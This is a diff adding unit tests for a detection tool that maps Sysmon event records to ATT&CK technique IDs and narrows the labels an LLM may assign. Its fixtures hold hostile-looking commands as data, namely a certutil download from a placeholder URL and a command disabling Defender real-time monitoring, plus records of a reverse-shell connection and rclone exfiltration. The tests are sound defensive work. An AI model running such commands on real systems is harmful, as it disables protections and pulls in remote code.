@@ -341,6 +341,140 @@ def test_the_technique_enum_keeps_null_for_ungrounded_findings():
     assert None in _branches()[0]["properties"]["technique"]["enum"]
 
 
+def test_each_record_gets_only_behavior_relevant_techniques():
+    """A large global vocabulary must not leak an unrelated LSASS label into PowerShell."""
+    record = {
+        "ref": "SYSMON#1",
+        "artifact": "evtx:Sysmon",
+        "event_id": 1,
+        "fields": {
+            "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            "CommandLine": "powershell Get-Process",
+        },
+        "flags": ["shell_spawned"],
+    }
+    built = _selection(records=[record], techniques=("T1003.001", "T1059.001"))
+    enum = _branches(built)[0]["properties"]["technique"]["enum"]
+
+    assert "T1059.001" in enum
+    assert "T1003.001" not in enum
+    assert None in enum
+
+    findings_schema = interpret_client.constrained_schema(
+        {"target_os": "windows", "techniques": [{"id": "T1003.001"}]},
+        [record],
+    )
+    findings_enum = findings_schema["properties"]["findings"]["items"][
+        "properties"
+    ]["technique"]["enum"]
+    assert "T1059.001" in findings_enum
+    assert "T1003.001" not in findings_enum
+
+
+def test_behavior_routing_preserves_rclone_exfiltration_candidates():
+    """The narrower vocabulary must retain techniques evidenced by this record."""
+    record = {
+        "ref": "SYSMON#3",
+        "artifact": "evtx:Sysmon",
+        "event_id": 3,
+        "fields": {
+            "Image": r"C:\Tools\rclone.exe",
+            "DestinationIp": "142.250.0.1",
+            "DestinationPort": "443",
+        },
+        "flags": ["network_connection"],
+    }
+    candidates = {
+        tid
+        for tid, _name in interpret_client.candidate_techniques_for_records(
+            {"target_os": "windows", "techniques": [{"id": "T1003.001"}]},
+            [record],
+        )
+    }
+
+    assert {"T1041", "T1048"} <= candidates
+    assert "T1003.001" not in candidates
+
+
+def test_behavior_routing_preserves_reverse_shell_and_defender_candidates():
+    scenario = {"target_os": "windows", "techniques": [{"id": "T1003.001"}]}
+    reverse_shell = {
+        "ref": "SYSMON#3",
+        "artifact": "evtx:Sysmon",
+        "event_id": 3,
+        "fields": {
+            "Image": "powershell.exe",
+            "DestinationIp": "192.0.2.10",
+            "DestinationPort": "4444",
+        },
+        "flags": ["suspicious_c2_port_connection", "network_connection"],
+    }
+    defender = {
+        "ref": "SYSMON#4",
+        "artifact": "evtx:Sysmon",
+        "event_id": 1,
+        "fields": {
+            "Image": "powershell.exe",
+            "CommandLine": "Set-MpPreference -DisableRealtimeMonitoring True",
+        },
+        "flags": ["shell_spawned", "security_tool_config_changed"],
+    }
+
+    reverse_ids = dict(
+        interpret_client.candidate_techniques_for_records(scenario, [reverse_shell])
+    )
+    defender_ids = dict(
+        interpret_client.candidate_techniques_for_records(scenario, [defender])
+    )
+
+    assert "T1041" in reverse_ids
+    assert "T1562.001" in defender_ids
+    assert "T1003.001" not in reverse_ids | defender_ids
+
+
+def test_unclassified_sysmon_event_uses_mapping_event_scope():
+    """A benign Event 1 must not inherit a technique mapped to another event kind."""
+    record = {
+        "ref": "SYSMON#9",
+        "artifact": "evtx:Sysmon",
+        "event_id": 1,
+        "fields": {"Image": r"C:\Windows\System32\notepad.exe"},
+        "flags": [],
+    }
+    candidates = {
+        tid
+        for tid, _name in interpret_client.candidate_techniques_for_records(
+            {"target_os": "windows", "techniques": [{"id": "T1003.001"}]},
+            [record],
+        )
+    }
+
+    assert "T1003.001" not in candidates
+
+
+def test_chunk_prompt_uses_the_same_narrow_vocabulary_as_the_schema():
+    record = {
+        "ref": "SYSMON#1",
+        "artifact": "evtx:Sysmon",
+        "event_id": 1,
+        "fields": {"Image": "certutil.exe", "CommandLine": "certutil -urlcache http://x/a"},
+        "flags": ["lolbin_download"],
+    }
+    scenario = {"target_os": "windows", "techniques": [{"id": "T1003.001", "name": "LSASS"}]}
+    client = interpret_client.InterpretClient(llm.StubBackend.__new__(llm.StubBackend))
+
+    prompt = client.select_user_prompt(scenario, [record])
+    label_line = next(line for line in prompt.splitlines() if "붙일 수 있는 기법" in line)
+    enum = _branches(_selection(records=[record], techniques=("T1003.001",)))[0][
+        "properties"
+    ]["technique"]["enum"]
+
+    assert "T1105(" in label_line
+    assert "T1003.001(" not in label_line
+    assert "T1105" in enum
+    assert "T1003.001" not in enum
+
+
 def test_evidence_fields_are_the_vocabulary_intersected_with_what_is_present():
     """어휘로 묶는 것은 무엇을 검증 대상으로 삼을지가 우리 결정이기 때문이고,
     실제 필드로 좁히는 것은 없는 이름을 못 내게 하기 위해서다."""
@@ -369,4 +503,3 @@ def test_the_selection_severity_matches_the_frozen_vocabulary():
     frozen = schema.load_schema("findings")
     allowed = frozen["properties"]["findings"]["items"]["properties"]["severity"]["enum"]
     assert _branches()[0]["properties"]["severity"]["enum"] == allowed
-
